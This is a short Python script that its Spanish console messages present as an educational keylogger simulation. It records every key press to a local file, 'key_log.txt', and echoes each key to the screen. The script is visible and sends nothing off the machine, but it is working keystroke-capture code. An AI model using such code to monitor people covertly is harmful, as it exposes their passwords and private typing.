import keyboard
import time

# Define the file name where keys will be saved
output_file = "key_log.txt"

print("Simulación de keylogger (educativo, guarda datos en 'key_log.txt')")
print("Presiona teclas, se guardarán en el archivo. Ctrl+C para salir.")

# Open the file in append mode ('a'). This creates the file if it doesn't exist,
# and adds new content to the end if it does.
with open(output_file, 'a') as f:
    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                key_name = event.name
                # Handle special keys for better readability in the log
                if key_name == 'space':
                    f.write(' ') # Write a space character
                elif key_name == 'enter':
                    f.write('\n') # Write a new line character
                elif key_name == 'backspace':
                    # This is tricky for simple log, might just log "[BACKSPACE]"
                    # Or for more advanced, you'd need to read, modify, and rewrite
                    f.write('[BACKSPACE]')
                elif key_name is not None and len(key_name) == 1:
                    # For single character keys (a-z, 0-9, symbols)f
                    f.write(key_name)
                else:
                    # For other special keys like 'shift', 'alt', 'ctrl', etc.
                    f.write(f'[{key_name}]') # Log them in brackets for clarity

                # Optionally print to console as well
                print(f"Tecla presionada y guardada: {key_name}")

            time.sleep(0.05) # Reduced sleep time for better responsiveness
    except KeyboardInterrupt:
        print("\nSimulación terminada. Datos guardados en 'key_log.txt'.")